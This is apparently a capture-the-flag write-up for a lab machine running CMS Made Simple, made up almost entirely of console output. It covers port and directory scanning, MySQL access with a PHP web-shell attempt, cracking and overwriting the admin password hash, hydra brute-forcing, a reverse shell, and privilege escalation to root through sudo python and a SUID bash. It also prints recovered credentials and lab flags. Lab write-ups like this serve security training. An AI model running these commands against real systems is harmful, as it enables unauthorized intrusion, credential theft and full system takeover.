# Recon

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# nmap -Pn -sT -sV -n -p- 192.168.234.74  --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-08 10:45 CST
Warning: 192.168.234.74 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.234.74
Host is up, received user-set (0.10s latency).
Not shown: 64319 closed ports, 1212 filtered ports
Reason: 64319 conn-refused and 1212 no-responses
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http    syn-ack Apache httpd 2.4.38 ((Debian))
3306/tcp  open  mysql?  syn-ack
33060/tcp open  mysqlx? syn-ack
```

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/1.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/2.png)

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# searchsploit CMS Made Simple
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                            | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                       | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                       | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                    | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                        | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                       | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                             | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                   | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                          | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                              | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                  | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                 | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                           | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                              | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                              | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                 | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                       | php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                              | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                 | php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                 | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                 | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                               | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                      | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                              | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                         | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                | php/webapps/46546.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# python3 /opt/dirsearch/dirsearch.py -u http://192.168.234.74/ -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-12-08_11-30-49.log

Target: http://192.168.234.74/

[11:30:49] Starting: 
[11:31:00] 301 -  316B  - /admin  ->  http://192.168.234.74/admin/
[11:31:01] 302 -    0B  - /admin/  ->  http://192.168.234.74/admin/login.php
[11:31:01] 302 -    0B  - /admin/?/login  ->  http://192.168.234.74/admin/login.php
[11:31:02] 302 -    0B  - /admin/index.php  ->  http://192.168.234.74/admin/login.php
[11:31:02] 200 -    4KB - /admin/login.php
[11:31:13] 301 -  317B  - /assets  ->  http://192.168.234.74/assets/
[11:31:19] 200 -    0B  - /config.php
[11:31:23] 301 -  314B  - /doc  ->  http://192.168.234.74/doc/
[11:31:23] 200 -   24B  - /doc/
[11:31:31] 200 -   19KB - /index.php
[11:31:33] 301 -  314B  - /lib  ->  http://192.168.234.74/lib/
[11:31:38] 301 -  318B  - /modules  ->  http://192.168.234.74/modules/
[11:31:43] 200 -   90KB - /phpinfo.php
[11:31:43] 401 -  461B  - /phpmyadmin
[11:31:44] 401 -  461B  - /phpmyadmin/
[11:31:44] 401 -  461B  - /phpmyadmin/scripts/setup.php
[11:31:55] 301 -  314B  - /tmp  ->  http://192.168.234.74/tmp/
[11:31:55] 200 -    1KB - /tmp/
[11:31:56] 301 -  318B  - /uploads  ->  http://192.168.234.74/uploads/
[11:31:57] 200 -    0B  - /uploads/

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/4.png)

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# python3 /opt/dirsearch/dirsearch.py -u http://192.168.234.74/ -e php,txt -x 403 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-21-12-08_11-37-08.log

Target: http://192.168.234.74/

[11:37:08] Starting: 
[11:37:09] 200 -   19KB - /
[11:37:10] 301 -  318B  - /modules  ->  http://192.168.234.74/modules/
[11:37:10] 301 -  318B  - /uploads  ->  http://192.168.234.74/uploads/
[11:37:11] 301 -  314B  - /doc  ->  http://192.168.234.74/doc/
[11:37:11] 301 -  316B  - /admin  ->  http://192.168.234.74/admin/
[11:37:12] 301 -  317B  - /assets  ->  http://192.168.234.74/assets/
[11:37:16] 301 -  314B  - /lib  ->  http://192.168.234.74/lib/
[11:37:44] 301 -  314B  - /tmp  ->  http://192.168.234.74/tmp/
[11:39:06] 401 -  461B  - /phpmyadmin

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/6.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/8.png)

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# searchsploit CMS Made Simple
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                              | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                         | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                         | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                      | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                          | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                         | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                               | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                     | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                            | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                    | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                   | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                             | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                   | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                         | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                  | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                   | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                  | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                    | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                        | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                     | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                    | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                        | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                   | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                   | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                 | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                        | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                           | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                  | php/webapps/46546.py
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple v2.2.13 - Paper                                                                                                 | docs/english/49947-cms-made-simp
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# searchsploit -x 49947
    Paper: CMS Made Simple v2.2.13 - Paper
      URL: https://www.exploit-db.com/papers/49947
     Path: /usr/share/exploitdb-papers/docs/english/49947-cms-made-simple-v2.2.13---paper.pdf
File Type: PDF document, version 1.4
```

```shell
file:///C:/Users/Admin/Downloads/49947-cms-made-simple-v2.2.13---paper.pdf
```

## MYSQL TCP/3306

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# mysql -h 192.168.234.74 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 135448
Server version: 8.0.19 MySQL Community Server - GPL

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

```console
MySQL [cmsms_db]> select load_file('/etc/passwd');
+--------------------------+
| load_file('/etc/passwd') |
+--------------------------+
| NULL                     |
+--------------------------+
1 row in set (0.10 sec)

MySQL [cmsms_db]> 
```

```console
MySQL [cmsms_db]> select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
MySQL [cmsms_db]>
```

```console
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cmsms_db           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.10 sec)

MySQL [(none)]> 
```

```console
MySQL [cmsms_db]> desc cms_users;
+---------------+--------------+------+-----+---------+-------+
| Field         | Type         | Null | Key | Default | Extra |
+---------------+--------------+------+-----+---------+-------+
| user_id       | int          | NO   | PRI | NULL    |       |
| username      | varchar(25)  | YES  |     | NULL    |       |
| password      | varchar(40)  | YES  |     | NULL    |       |
| admin_access  | tinyint      | YES  |     | NULL    |       |
| first_name    | varchar(50)  | YES  |     | NULL    |       |
| last_name     | varchar(50)  | YES  |     | NULL    |       |
| email         | varchar(255) | YES  |     | NULL    |       |
| active        | tinyint      | YES  |     | NULL    |       |
| create_date   | datetime     | YES  |     | NULL    |       |
| modified_date | datetime     | YES  |     | NULL    |       |
+---------------+--------------+------+-----+---------+-------+
10 rows in set (0.10 sec)

MySQL [cmsms_db]> select username,password from cms_users;
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 59f9ba27528694d9b3493dfde7709e70 |
+----------+----------------------------------+
1 row in set (0.11 sec)

MySQL [cmsms_db]> 
```

```console
MySQL [cmsms_db]> SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask';
+------------------+
| sitepref_value   |
+------------------+
| a235561351813137 |
+------------------+
1 row in set (0.10 sec)
```

```console
MySQL [cmsms_db]> select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'p4ssword'));
+----------------------------------------------------------------------------------------------------------------+
| md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'p4ssword')) |
+----------------------------------------------------------------------------------------------------------------+
| 59f9ba27528694d9b3493dfde7709e70                                                                               |
+----------------------------------------------------------------------------------------------------------------+
1 row in set (0.10 sec)

MySQL [cmsms_db]> select password from cms_users;
+----------------------------------+
| password                         |
+----------------------------------+
| 59f9ba27528694d9b3493dfde7709e70 |
+----------------------------------+
1 row in set (0.10 sec)

MySQL [cmsms_db]> 
```

```console
MySQL [cmsms_db]> select md5("a235561351813137p4ssword");
+----------------------------------+
| md5("a235561351813137p4ssword")  |
+----------------------------------+
| 59f9ba27528694d9b3493dfde7709e70 |
+----------------------------------+
1 row in set (0.10 sec)

MySQL [cmsms_db]> 
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/11.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/10.png)

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.234.74 http-form-post "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-08 12:56:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking http-post-form://192.168.234.74:80//admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect
[STATUS] 509.00 tries/min, 509 tries in 00:00h, 0 to do in 01:00h, 14343890 active
[STATUS] 513.00 tries/min, 1539 tries in 00:00h, 0 to do in 03:00h, 14342860 active
[STATUS] 513.43 tries/min, 3594 tries in 00:00h, 0 to do in 07:00h, 14340805 active
[STATUS] 512.20 tries/min, 7683 tries in 00:00h, 0 to do in 15:00h, 14336716 active
[STATUS] 487.00 tries/min, 15097 tries in 00:00h, 0 to do in 31:00h, 14329302 active
[STATUS] 495.32 tries/min, 23280 tries in 00:00h, 0 to do in 47:00h, 14321119 active
[STATUS] 501.56 tries/min, 31598 tries in 00:01h, 0 to do in 03:00h, 14312801 active
[STATUS] 505.16 tries/min, 39908 tries in 00:01h, 0 to do in 19:00h, 14304491 active
[STATUS] 507.71 tries/min, 48232 tries in 00:01h, 0 to do in 35:00h, 14296167 active
[STATUS] 509.32 tries/min, 56535 tries in 00:01h, 0 to do in 51:00h, 14287864 active
[STATUS] 510.27 tries/min, 64804 tries in 00:02h, 0 to do in 07:00h, 14279595 active
[80][http-post-form] host: 192.168.234.74   login: admin   password: p4ssword
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-08 15:14:01
```

```console
MySQL [cmsms_db]> update cms_users set password = "dbe6ea8d7353e8e8ed635dd1fffb8542" where username = "admin";
Query OK, 1 row affected (0.11 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [cmsms_db]> select password from cms_users;
+----------------------------------+
| password                         |
+----------------------------------+
| dbe6ea8d7353e8e8ed635dd1fffb8542 |
+----------------------------------+
1 row in set (0.10 sec)

MySQL [cmsms_db]> 
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/12.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/13.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/My-CMSMS/img/14.png)


```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.74] 50936
bash: cannot set terminal process group (555): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mycmsms:/var/www/html/admin$ whoami
whoami
www-data
www-data@mycmsms:/var/www/html/admin$ 
```

```console
root@kali:/OSCPv3/offsec_pg/My-CMSMS# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.74] 50946
bash: cannot set terminal process group (555): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mycmsms:/var/www/html/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@mycmsms:/var/www/html/admin$ ^Z
[1]+  Detenido                nc -lvnp 4444
root@kali:/OSCPv3/offsec_pg/My-CMSMS# stty raw -echo
root@kali:/OSCPv3/offsec_pg/My-CMSMS# nc -lvnp 4444
                                                   reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@mycmsms:/var/www/html/admin$ export SHELL=bash
www-data@mycmsms:/var/www/html/admin$ export TERM=xterm-256color
www-data@mycmsms:/var/www/html/admin$ stty rows 17 columns 144
www-data@mycmsms:/var/www/html/admin$ 
```

```console
www-data@mycmsms:/var/www/html/admin$ locate local.txt
/var/www/local.txt
www-data@mycmsms:/var/www/html/admin$ cat /var/www/local.txt
67b92723f4ea97ffe26a8a27bcab7c89
```

# Privilege escalation

```console
www-data@mycmsms:/home/armour$ ls -la
total 36
drwxr-xr-x 4 armour armour 4096 Aug 28  2020 .
drwxr-xr-x 3 root   root   4096 Mar 25  2020 ..
-rw------- 1 armour armour    0 Aug 20  2020 .bash_history
-rw-r--r-- 1 armour armour  220 Mar 25  2020 .bash_logout
-rw-r--r-- 1 armour armour 3526 Mar 25  2020 .bashrc
drwx------ 3 armour armour 4096 Jun 29  2020 .gnupg
drwxr-xr-x 3 armour armour 4096 Aug 20  2020 .local
-rw-r--r-- 1 armour armour  807 Mar 25  2020 .profile
-rw------- 1 armour armour  736 Jun 25  2020 .viminfo
-rwsr-xr-x 1 root   root     57 Jun 24  2020 binary.sh
```

```console
www-data@mycmsms:/home/armour$ ls -la
total 36
drwxr-xr-x 4 armour armour 4096 Aug 28  2020 .
drwxr-xr-x 3 root   root   4096 Mar 25  2020 ..
-rw------- 1 armour armour    0 Aug 20  2020 .bash_history
-rw-r--r-- 1 armour armour  220 Mar 25  2020 .bash_logout
-rw-r--r-- 1 armour armour 3526 Mar 25  2020 .bashrc
drwx------ 3 armour armour 4096 Jun 29  2020 .gnupg
drwxr-xr-x 3 armour armour 4096 Aug 20  2020 .local
-rw-r--r-- 1 armour armour  807 Mar 25  2020 .profile
-rw------- 1 armour armour  736 Jun 25  2020 .viminfo
-rwsr-xr-x 1 root   root     57 Jun 24  2020 binary.sh
www-data@mycmsms:/home/armour$ cat binary.sh 
#!/bin/bash
echo "Usage: binary.sh COMMAND"

echo `$1`
```

```console
www-data@mycmsms:/home/armour$ echo "chmod u+s binary.sh" >> binary.sh
bash: binary.sh: Permission denied
```

```console
www-data@mycmsms:/home/armour$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1464 Jun 24  2020 /etc/passwd
www-data@mycmsms:/home/armour$ ls -la /etc/shadow
-rw-r----- 1 root shadow 968 Aug 20  2020 /etc/shadow
```

```console
www-data@mycmsms:/home/armour$ find / -perm -u=s -type f 2>/dev/null
/home/armour/binary.sh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```console
www-data@mycmsms:/home/armour$ cat /var/www/html/admin/.htpasswd | base64 --decode 
MFZG233VOI5FG2DJMVWGIQBRGIZQ====www-data@mycmsms:/home/armour$
```

```console
MFZG233VOI5FG2DJMVWGIQBRGIZQ====www-data@mycmsms:/home/armour$ cat /var/www/html/admin/.htpasswd | base64 --decode | base32 --decode
armour:Shield@123www-data@mycmsms:/home/armour$ 
```

```console
www-data@mycmsms:/home/armour$ su armour
Password: 
armour@mycmsms:~$ whoami
armour
armour@mycmsms:~$ 
```

```console
armour@mycmsms:~$ sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
armour@mycmsms:~$ /usr/bin/python --version
Python 2.7.16
``` 

```console
armour@mycmsms:~$ sudo python -c 'import os; os.system("/bin/sh")'
# whoami
root
# cd /root	
# ls
proof.txt
# cat proof.txt
dae5b777423d02ef694c983374c92029
# 
```

```console
armour@mycmsms:~$ sudo python -c 'import os; os.system("chmod u+s /bin/bash")'
armour@mycmsms:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
armour@mycmsms:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/proof.txt 
dae5b777423d02ef694c983374c92029
``` 



